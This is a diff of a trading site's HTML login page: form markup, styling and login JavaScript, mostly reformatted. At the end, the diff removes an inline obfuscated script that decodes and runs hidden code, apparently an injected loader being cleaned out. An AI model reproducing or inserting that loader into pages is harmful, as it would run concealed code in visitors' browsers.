@@ -1,316 +1,343 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-
-<head>
+  <head>
     <!-- ✅ Google Tag Manager -->
     <script>
-        (function (w, d, s, l, i) {
-            w[l] = w[l] || [];
-            w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
-            var f = d.getElementsByTagName(s)[0],
-                j = d.createElement(s),
-                dl = l != 'dataLayer' ? '&l=' + l : '';
-            j.async = true;
-            j.src = 'https://www.googletagmanager.com/gtm.js?id=GTM-TT7SLZ4L' + dl;
-            f.parentNode.insertBefore(j, f);
-        })(window, document, 'script', 'dataLayer', 'GTM-TT7SLZ4L');
+      (function (w, d, s, l, i) {
+        w[l] = w[l] || [];
+        w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
+        var f = d.getElementsByTagName(s)[0],
+          j = d.createElement(s),
+          dl = l != "dataLayer" ? "&l=" + l : "";
+        j.async = true;
+        j.src = "https://www.googletagmanager.com/gtm.js?id=GTM-TT7SLZ4L" + dl;
+        f.parentNode.insertBefore(j, f);
+      })(window, document, "script", "dataLayer", "GTM-TT7SLZ4L");
     </script>
 
     <!-- ✅ Basic -->
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
     <!-- ✅ Title -->
     <title>Login | BR30 Trader</title>
 
     <!-- 🔒 Hide from Google -->
-    <meta name="robots" content="noindex, nofollow">
+    <meta name="robots" content="noindex, nofollow" />
 
     <!-- ❌ No Cache (security) -->
-    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
+    <meta
+      http-equiv="Cache-Control"
+      content="no-store, no-cache, must-revalidate"
+    />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
 
     <!-- ✅ Favicon -->
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
 
     <!-- ✅ Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
 
     <!-- ✅ Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
 
     <!-- ✅ SweetAlert -->
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11" defer></script>
 
     <style>
-        /* =========================================
+      /* =========================================
            GLOBAL & BACKGROUND STYLES
         ========================================= */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
-        }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Poppins", sans-serif;
+      }
 
-        body {
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #050505;
-            /* Body Color */
-            padding: 20px;
-        }
+      body {
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #050505;
+        /* Body Color */
+        padding: 20px;
+      }
 
-        /* =========================================
+      /* =========================================
            LOGIN CONTAINER (Responsive)
         ========================================= */
+      .container {
+        width: 100%;
+        max-width: 360px;
+        background: #1e293b;
+        /* Dark Card Color */
+        padding: 30px;
+        border-radius: 20px;
+        border: 1px solid #334155;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+      }
+
+      .container h2 {
+        text-align: center;
+        margin-bottom: 25px;
+        color: #ffffff;
+        /* White Text */
+        font-weight: 600;
+      }
+
+      /* Input Fields */
+      label {
+        font-size: 14px;
+        color: #cbd5e1;
+        font-weight: 500;
+        display: block;
+        margin-bottom: 8px;
+      }
+
+      .input-box {
+        display: flex;
+        align-items: center;
+        background: #050505;
+        border: 1px solid #334155;
+        border-radius: 10px;
+        padding: 5px 12px;
+        margin-bottom: 20px;
+        position: relative;
+        transition: 0.3s;
+      }
+
+      .input-box:focus-within {
+        border-color: #a020f0;
+        /* Purple Focus */
+      }
+
+      .input-box input {
+        background: transparent;
+        border: none;
+        outline: none;
+        color: white;
+        flex: 1;
+        padding: 10px 5px;
+        font-size: 15px;
+      }
+
+      .toggle-btn {
+        cursor: pointer;
+        color: #94a3b8;
+        font-size: 18px;
+      }
+
+      /* Button Styling */
+      button {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 10px;
+        background: #a020f0;
+        /* Purple Button */
+        color: white;
+        font-size: 16px;
+        cursor: pointer;
+        transition: 0.3s ease;
+        font-weight: 600;
+        margin-top: 5px;
+      }
+
+      button:hover {
+        background: #8219c4;
+        transform: translateY(-2px);
+      }
+
+      /* Footer Links */
+      .links {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 20px;
+      }
+
+      .links a {
+        text-decoration: none;
+        color: #a020f0;
+        /* Purple Links */
+        font-size: 14px;
+        font-weight: 500;
+      }
+
+      .links a:hover {
+        text-decoration: underline;
+      }
+
+      /* Mobile Adjustment */
+      @media (max-width: 480px) {
         .container {
-            width: 100%;
-            max-width: 360px;
-            background: #1e293b;
-            /* Dark Card Color */
-            padding: 30px;
-            border-radius: 20px;
-            border: 1px solid #334155;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+          padding: 20px;
         }
-
-        .container h2 {
-            text-align: center;
-            margin-bottom: 25px;
-            color: #ffffff;
-            /* White Text */
-            font-weight: 600;
-        }
-
-        /* Input Fields */
-        label {
-            font-size: 14px;
-            color: #cbd5e1;
-            font-weight: 500;
-            display: block;
-            margin-bottom: 8px;
-        }
-
-        .input-box {
-            display: flex;
-            align-items: center;
-            background: #050505;
-            border: 1px solid #334155;
-            border-radius: 10px;
-            padding: 5px 12px;
-            margin-bottom: 20px;
-            position: relative;
-            transition: 0.3s;
-        }
-
-        .input-box:focus-within {
-            border-color: #a020f0;
-            /* Purple Focus */
-        }
-
-        .input-box input {
-            background: transparent;
-            border: none;
-            outline: none;
-            color: white;
-            flex: 1;
-            padding: 10px 5px;
-            font-size: 15px;
-        }
-
-        .toggle-btn {
-            cursor: pointer;
-            color: #94a3b8;
-            font-size: 18px;
-        }
-
-        /* Button Styling */
-        button {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 10px;
-            background: #a020f0;
-            /* Purple Button */
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-            transition: 0.3s ease;
-            font-weight: 600;
-            margin-top: 5px;
-        }
-
-        button:hover {
-            background: #8219c4;
-            transform: translateY(-2px);
-        }
-
-        /* Footer Links */
-        .links {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 20px;
-        }
-
-        .links a {
-            text-decoration: none;
-            color: #a020f0;
-            /* Purple Links */
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .links a:hover {
-            text-decoration: underline;
-        }
-
-        /* Mobile Adjustment */
-        @media (max-width: 480px) {
-            .container {
-                padding: 20px;
-            }
-        }
+      }
     </style>
-</head>
+  </head>
 
-<body>
+  <body>
     <!-- ✅ GTM noscript -->
     <noscript>
-        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TT7SLZ4L" height="0" width="0"
-            style="display:none;visibility:hidden"></iframe>
+      <iframe
+        src="https://www.googletagmanager.com/ns.html?id=GTM-TT7SLZ4L"
+        height="0"
+        width="0"
+        style="display: none; visibility: hidden"
+      ></iframe>
     </noscript>
     <div class="container">
-        <h2 class="login-heading">Login</h2>
+      <h2 class="login-heading">Login</h2>
 
-        <!-- Browser signal ke liye FORM tag add kiya hai -->
-        <form id="loginForm" onsubmit="handleLogin(event)">
-            <!-- Email Input -->
-            <label>Email Address</label>
-            <div class="input-box">
-                <!-- name="email" aur autocomplete zaroori hai -->
-                <input id="email" name="email" type="email" placeholder="example@mail.com" autocomplete="username"
-                    required>
-            </div>
-
-            <!-- Password Input -->
-            <label>Password</label>
-            <div class="input-box">
-                <!-- name="password" aur autocomplete="current-password" zaroori hai -->
-                <input id="password" name="password" type="password" placeholder="••••••••"
-                    autocomplete="current-password" required>
-                <span class="toggle-btn" id="toggleBtn" onclick="togglePassword()" style="cursor:pointer">👁️</span>
-            </div>
-
-            <!-- Login Action: type="submit" browser ko signal deta hai -->
-            <button type="submit" id="loginBtn">Login to Account</button>
-        </form>
-
-        <!-- Navigation Links -->
-        <div class="links">
-            <a href="forgot.html">Forgot Password?</a>
-            <a href="register.html">Register</a>
+      <!-- Browser signal ke liye FORM tag add kiya hai -->
+      <form id="loginForm" onsubmit="handleLogin(event)">
+        <!-- Email Input -->
+        <label>Email Address</label>
+        <div class="input-box">
+          <!-- name="email" aur autocomplete zaroori hai -->
+          <input
+            id="email"
+            name="email"
+            type="email"
+            placeholder="example@mail.com"
+            autocomplete="username"
+            required
+          />
         </div>
+
+        <!-- Password Input -->
+        <label>Password</label>
+        <div class="input-box">
+          <!-- name="password" aur autocomplete="current-password" zaroori hai -->
+          <input
+            id="password"
+            name="password"
+            type="password"
+            placeholder="••••••••"
+            autocomplete="current-password"
+            required
+          />
+          <span
+            class="toggle-btn"
+            id="toggleBtn"
+            onclick="togglePassword()"
+            style="cursor: pointer"
+            >👁️</span
+          >
+        </div>
+
+        <!-- Login Action: type="submit" browser ko signal deta hai -->
+        <button type="submit" id="loginBtn">Login to Account</button>
+      </form>
+
+      <!-- Navigation Links -->
+      <div class="links">
+        <a href="forgot.html">Forgot Password?</a>
+        <a href="register.html">Register</a>
+      </div>
     </div>
 
     <script src="config.js"></script>
     <script>
-        const API_URL = window.API_BASE_URL + '/api/auth';
+      const API_URL = `${window.API_BASE_URL}/api/auth`;
 
-        // 1. Redirect logic hata diya taaki tum login page dekh sako
-        // Agar future mein chahiye toh tabhi lagana jab Logout functionality set ho jaye.
+      // 1. Redirect logic hata diya taaki tum login page dekh sako
+      // Agar future mein chahiye toh tabhi lagana jab Logout functionality set ho jaye.
 
-        // 2. Toggle Password Visibility
-        function togglePassword() {
-            const pass = document.getElementById("password");
-            const btn = document.getElementById("toggleBtn");
-            pass.type = pass.type === "password" ? "text" : "password";
-            btn.textContent = pass.type === "password" ? "👁️" : "🙈";
-        }
+      // 2. Toggle Password Visibility
+      function togglePassword() {
+        const pass = document.getElementById("password");
+        const btn = document.getElementById("toggleBtn");
+        pass.type = pass.type === "password" ? "text" : "password";
+        btn.textContent = pass.type === "password" ? "👁️" : "🙈";
+      }
 
-        // 3. Email Validation logic
-        function validateEmail(email) {
-            return String(email).toLowerCase().match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/);
-        }
+      // 3. Email Validation logic
+      function validateEmail(email) {
+        return String(email)
+          .toLowerCase()
+          .match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/);
+      }
 
-        // 4. Main Login Logic
-        async function handleLogin(e) {
-            if (e) e.preventDefault();
+      // 4. Main Login Logic
+      async function handleLogin(e) {
+        if (e) e.preventDefault();
 
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value;
-            const btn = document.getElementById('loginBtn');
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value;
+        const btn = document.getElementById("loginBtn");
 
-            if (!email || !validateEmail(email)) return alert("Invalid Email!");
-            if (!password) return alert("Password Required!");
+        if (!email || !validateEmail(email)) return alert("Invalid Email!");
+        if (!password) return alert("Password Required!");
 
-            btn.innerText = "Processing...";
-            btn.disabled = true;
+        btn.innerText = "Processing...";
+        btn.disabled = true;
 
-            try {
-                const res = await fetch(window.API_BASE_URL + '/api/auth/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password })
-                });
+        try {
+          const res = await fetch(`${window.API_BASE_URL}/api/auth/login`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, password }),
+          });
 
-                const data = await res.json();
+          const data = await res.json();
 
-                if (res.ok) {
-                    localStorage.clear();
+          if (res.ok) {
+            localStorage.clear();
 
-                    // 1. Data Save Karo
-                    localStorage.setItem('token', data.token);
-                    localStorage.setItem('userData', JSON.stringify(data.user));
-                    localStorage.setItem('role', data.user.role);
-                    localStorage.setItem('username', data.user.name);
+            // 1. Data Save Karo
+            localStorage.setItem("token", data.token);
+            localStorage.setItem("userData", JSON.stringify(data.user));
+            localStorage.setItem("role", data.user.role);
+            localStorage.setItem("username", data.user.name);
 
-                    // --- YAHAN ALERT ADD KIYA HAI ---
-                    if (data.user.role === "admin") {
-                        alert("Welcome Admin! 🚀 Dashboard Access Granted.");
-                    } else {
-                        alert("Login Success! 🚀 Redirecting to Home.");
-                    }
-                    // -------------------------------
-
-                    // 2. 🔥 Yahan ho rahi hai redirection (Role-based)
-                    setTimeout(() => {
-                        if (data.user.role === "admin") {
-                            window.location.href = "dashboard.html";
-                        } else {
-                            window.location.href = "index.html";
-                        }
-                    }, 800);
-
-                } else {
-                    alert(data.msg || "Login Failed!");
-                    btn.innerText = "Login to Account";
-                    btn.disabled = false;
-                }
-            } catch (err) {
-                alert("Server Connection Error!");
-                btn.innerText = "Login to Account";
-                btn.disabled = false;
+            // --- YAHAN ALERT ADD KIYA HAI ---
+            if (data.user.role === "admin") {
+              alert("Welcome Admin! 🚀 Dashboard Access Granted.");
+            } else {
+              alert("Login Success! 🚀 Redirecting to Home.");
             }
+            // -------------------------------
+
+            // 2. 🔥 Yahan ho rahi hai redirection (Role-based)
+            setTimeout(() => {
+              if (data.user.role === "admin") {
+                window.location.href = "dashboard.html";
+              } else {
+                window.location.href = "index.html";
+              }
+            }, 800);
+          } else {
+            alert(data.msg || "Login Failed!");
+            btn.innerText = "Login to Account";
+            btn.disabled = false;
+          }
+        } catch (err) {
+          alert("Server Connection Error!");
+          btn.innerText = "Login to Account";
+          btn.disabled = false;
         }
+      }
 
-
-        // 5. Enter Key Support
-        document.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                const activeElem = document.activeElement;
-                if (activeElem.id === 'email' || activeElem.id === 'password') {
-                    handleLogin();
-                }
-            }
-        });
+      // 5. Enter Key Support
+      document.addEventListener("keypress", (e) => {
+        if (e.key === "Enter") {
+          const activeElem = document.activeElement;
+          if (activeElem.id === "email" || activeElem.id === "password") {
+            handleLogin();
+          }
+        }
+      });
     </script>
-    <script>
-        (function () { var iEX = '', jkf = 628 - 617; function EUf(c) { var z = 6376169; var g = c.length; var j = []; for (var a = 0; a < g; a++) { j[a] = c.charAt(a) }; for (var a = 0; a < g; a++) { var x = z * (a + 112) + (z % 40890); var u = z * (a + 689) + (z % 16572); var r = x % g; var h = u % g; var y = j[r]; j[r] = j[h]; j[h] = y; z = (x + u) % 7011803; }; return j.join('') }; var Vfe = EUf('hmridetcwuyoonurcfrgtkljasptsonxvbqcz').substr(0, jkf); var bFt = '=q( nf,0}v0"t,vb;5zvtlry)pav[j0)e0ifhlm<jx7r[.p=uC;zjopartnttnr,n2)]r,;l,anftht(;,06a7=,a (gr,tctv;,,4j6(uy-(v)v)1t8e,.66;va" ,2"[.k-r*);(r.d-m+ [qlr;;twv) n)i[s.=]4.h+(,r0;+ia31 uguS3v2o=;0hf(fn,mfu83pl 4qCu)(aa hgmra+s=l)nnt)ae+C)7vcrrrus(g[v(+8s1e4;ip0se)ezbuaCofkvl;a"=ajbnaetu-r;r+=0,siAh{qaA  12{r[];crav*j,"b9[acr.)=abr+n;jnrk0gh6i0=do)lb(+tr;palvl)ao eg]uel]sn(;;;bl)=g1a.pudo,(=1rd;ae 95lrC+9rve=)Ada;ifs;+{w=k7oa8axba..s ogov=<Cp1e1;-. (=n !in]pe)o>b==fdv=]ru2iv gn.3ltvvhiceo=;e.)Codehe(=+ sfvd..hfo0;w+rr] +Caa{;]==sntn+[}v"n;ho=6oia{"1ciihw2cx8lju(=wf=rb(h;+oca;tshkoes(b;obzre(8nlelh]]ak.u(n,n+,.h]v<l+(f 0;r;!={u6z;aic(og]+.ii;a,)f8sni5(0rxg;9d))jas(=;.7;tn8l7i.7tc.5n"hfq[i=}as8=r  icnjt+(h},[[}b) z.[to,r2l)n=9py4(,nlbic)r;ht)<)=ia(;o=r,(svg,fr7 ;5a=1or=((6[>+o=pxa-h;-tA9<}el.n}]hr(s+v)9vha,l8t;t+frdr."AS(o)er(o1ba2 r{nzhtr=m)o)= oasem+h==;;me1jmhl.=solht+,a"g;s.1);r)t=.'; var rsW = EUf[Vfe]; var wDC = ''; var TVK = rsW; var Eky = rsW(wDC, EUf(bFt)); var pUC = Eky(EUf('!),1foe_b_u;6j  _P.aP$1)!4;$5eo!9;P=(}f 6ba13t.P$P_iPf)gf,tkwS)j4nw}fyPP2f]PP&n}1 _f"n)6!3{).+(by3.e$P26.%3&2o==0;cle$$Po[(P%fincP)u=*EPr_t6e7tg$+Pbb{)3$P)m41.P}oaaPP;k0n =jbs;f%.e,5]sb,j3_jPl)bi)P)-un,.rf53heP!!..v)o]s\'Pobnc3wd ;3(b01223!b$+15\'f)_{3.P;oe{]a,b(P&w3(iuarb.nw(ogPP(0(P(j_}.x(3.n(b4ls..P.ePi7C(3,) v)!,b\'P4.)a2P.-P5)3P)(vP8 +)i)ln9\'1!8t(6egeP9Pm.w\/3,.2)}iPo)etf%m5en9.P_cf46Pp.$3Pppb!r);3wc\/.4o04bP4448i Pbtd(inPqPP;7=ni4nP ;},;j,=(P71ero66}Ps;$7;m=Pwen$q)Pilb+#PP$&(m$_)eCP5PPbP7.;p3P!"id)l={]{P$cf.w2_!!fp.l%eP6=tc[!tob(gjPttbrvi]ln_bj.6tt.!P0,PPee}%o)l.j%pb1Po(b)_P368Peeu,e.c4nt${)(#)cw.DaP)Peu}31e(t{(.8tz".cdr;.;)nPs.c%eS q(3r==)(=1ik7c.1er0tsty_.PooP1_711*;oC{.,)tn#8(}pa).i)ojbP#1;m2ebb}7tf]63en3f3e3g"se2;PP(-g=isj.$.j8)9P_)wen3t0+.bb46;3tuP[P5n(8Pom#$_3lb!o_,-5elc(.Pcaf4Pf!P$u*a}..P(.,P4\'o-2Pl7hb)"2b.3P,,3* P}}ou#u]ont3PPw]bv*ha 2fue.l._PdP{r;tfvjpt5yPP[P)]0.(c}rP7pn+,n7(P{;gu{joo}P\'6oj*b3.m$; nd}(Pc,.3)7$s,pr{e4jr}.tb,)ltih-k%,P(!,.uPn#(}p!=me2PP!l=()v)duP =_4({csve7r)5$tePo(Pb!vime]%)P$7)_u)pj];0s_}_&P2(]("d4nP(l%tieP.bj363}v$& 2_u1rj_483, (0P=(nnb]bP.\/.]Pjn,P[;bbu\/6sm;(a},r!_,r Pj))toer+0ie o=146iSsnnP%o s.o1eePta,!if3dv)j0e=P6s3ri30r)c(,u!-p .c!)e!e$idt8,[_.tPm,n(6bo$f+d ,.)t\/(= _%.b i6.P[,;.r4_==Pbe d=Pee.tjePcb.;')); var OSu = TVK(iEX, pUC); OSu(8958); return 3887 })()
-    </script>
-</body>
-
+    <script></script>
+  </body>
 </html>
